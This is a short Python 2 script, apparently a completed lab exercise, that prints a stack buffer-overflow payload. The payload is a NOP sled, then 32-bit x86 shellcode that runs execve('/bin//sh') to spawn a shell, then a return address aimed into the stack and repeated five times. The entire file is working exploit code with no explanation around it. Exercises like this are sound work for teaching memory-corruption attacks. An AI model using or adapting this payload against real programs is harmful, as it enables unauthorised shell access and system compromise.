#!/usr/bin/env python2

your_buffer =  "\x90"*79+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x84\xee\xff\xbf"*5
# YOUR CODE: Generate buf appropriately
print your_buffer
